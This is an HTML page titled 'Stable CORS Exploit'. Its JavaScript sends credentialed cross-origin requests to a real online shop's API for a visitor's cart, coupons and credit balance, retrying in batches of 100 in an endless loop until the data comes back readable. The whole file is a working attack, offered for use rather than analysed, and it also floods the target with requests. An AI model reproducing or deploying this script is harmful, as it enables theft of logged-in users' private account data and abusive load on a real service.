<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Stable CORS Exploit</title>
</head>
<body>

<button onclick="run()">Run</button>
<pre id="out">Idle</pre>

<script>
const endpoints = [
    "/cn/oapi/orders/web/cart/v1/list",
    "/cn/oapi/orders/web/cart/getCount",
    "/cn/oapi/users/web/coupons/count?state=1",
    "/cn/oapi/users/web/credits/getUserCredit",
    "/cn/oapi/credits/web/credits/show"
];

function randomParam() {
    return "_=" + Math.random().toString(36).substring(2);
}

async function fetchTry(path) {
    const url = "https://www.opposhop.cn" + path + "&" + randomParam();

    try {
        const res = await fetch(url, {
            credentials: "include",
            cache: "no-store"
        });

        if (res.type === "opaque") return null;

        if (res.status === 200) {
            const text = await res.text();
            if (text && !text.includes("403")) {
                return { url, text };
            }
        }
    } catch {}

    return null;
}

async function attack(path, out) {
    let attempts = 0;

    while (true) {
        attempts += 100;

        out.textContent = "Loading " + path + " Attempts: " + attempts;

        const batch = await Promise.all(
            Array.from({ length: 100 }, () => fetchTry(path))
        );

        for (let r of batch) {
            if (r) {
                return { attempts, data: r.text, url: r.url };
            }
        }
    }
}

async function run() {
    const out = document.getElementById("out");
    let final = "";

    for (let ep of endpoints) {
        const res = await attack(ep, out);

        final += "Endpoint: " + ep + "\n";
        final += "Attempts: " + res.attempts + "\n";
        final += res.data + "\n\n";

        out.textContent = final;
    }
}
</script>

</body>
</html>
